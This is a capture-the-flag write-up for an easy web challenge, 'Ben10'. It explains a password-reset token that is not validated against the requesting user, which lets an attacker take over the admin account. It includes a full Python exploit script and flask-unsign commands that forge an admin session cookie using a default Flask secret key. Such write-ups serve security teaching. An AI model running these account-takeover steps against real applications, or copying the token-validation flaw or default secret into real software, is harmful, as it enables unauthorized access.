# Ben10

- **Category:** Web
- **Solves:** 360
- **Difficulty:** Easy
- **Author:** @gheddus

## Description

Ben Tennyson's Omnitrix holds a mysterious and powerful form called Materia Grigia — a creature that only those with the sharpest minds can access. It's hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what’s truly hidden.

Can you outsmart the system and reveal the flag?

## Details

This challenge is inspired by a broken access control vulnerability found in the wild, where restricted resources were unexpectedly exposed. The idea behind this challenge is based on that very flaw, where access to certain features should have been locked down but wasn't.

## Solution

The first step is to register a new user on the application. After completing the registration, the user logs in using the same credentials (username and password) they just created.

Once logged in, the user navigates to the homepage, where a hidden section contains information about the admin. This data, located in an element with the ID `admin_data`, follows the format `admin^<username>^<random>`. The attacker’s goal is to extract the admin's username from this section.

After logging out, the user tries to reset the admin’s password. The reset token request is made using the previously registered username since admin users can not request it due to the application security policy. The reset token is not properly validated against the requesting user and as a result, the attacker can use the reset token to change the admin's password.

The attacker logs in with the admin username and the new password. This grants the attacker access to the admin’s account, bypassing the intended access control. Finally, the attacker visits a page that contains the flag (the image with ben10), successfully retrieving it.

**Python script:**
```python
import requests
import re
import random
import string
from bs4 import BeautifulSoup

def extract_admin_data(html):
    soup = BeautifulSoup(html, 'html.parser')
    admin_data = soup.find(id="admin_data")
    if admin_data:
        match = re.match(r"admin\^.+?\^.+", admin_data.text)
        if match:
            return match.group(0)
    return None

def extract_reset_token(html):
    soup = BeautifulSoup(html, 'html.parser')
    reset_token_info = soup.find('p')
    if reset_token_info and "Your reset token is:" in reset_token_info.text:
        token_match = re.search(r"Your reset token is: (\w+)", reset_token_info.text)
        if token_match:
            return token_match.group(1)
    return None

def extract_flag(html):
    soup = BeautifulSoup(html, 'html.parser')
    flag_text = soup.find('p', class_='error').get_text()
    flag = re.search(r'srdnlen\{.*?\}', flag_text)
    return flag.group(0) if flag else None

req = requests.session()
url = "http://localhost:5000"
user = "testuser"

# register a new user, login, and grab the admin username
registration = req.post(url + "/register", data={"username": user, "password": user})
login = req.post(url + "/login", data={"username": user, "password": user})
home = req.get(url + "/home")
admin_username = extract_admin_data(home.text)
# print(admin_username)

# start with a fresh session, request the reset password for the registed user
req = requests.session()
reset_password = req.post(url + "/reset_password", data={"username": user})
reset_token = extract_reset_token(reset_password.text)
# print(reset_token)

# use the reset token to change the admin's password (access control vulnerability here)
forgot_password = req.post(url + "/forgot_password", data={
    "username": admin_username, "reset_token": reset_token, "new_password": user, "confirm_password": user
})

# login and grab the flag
login = req.post(url + "/login", data={"username": admin_username, "password": user})
ben10 = req.get(url + "/image/ben10")
flag = extract_flag(ben10.text)

print(flag)
# flag = srdnlen{b3n_l0v3s_br0k3n_4cc355_c0ntr0l_vulns}
```

## Unintended Solution
I completely forgot to change the Flask's `app.secret_key` on the server. This resulted in an unintended solution where the secret used to sign the cookies was exposed, allowing users to successfully sign arbitrary session cookies using the known `app.secret_key=your_secret_key`.

```shell
$ flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6InRlc3QifQ.Z5EO9A.L_61GQGElWglQmZs6N7APg17AKo'
{'username': 'test'}

$ flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'your_secret_key'
eyJ1c2VybmFtZSI6ImFkbWluIn0.Z5EPSg.J6pEfgm3s510HmoWew8JPbnwKLE

# login in the application

# grab the flag visiting /image/ben10

# flag = srdnlen{b3n_l0v3s_br0k3n_4cc355_c0ntr0l_vulns}
```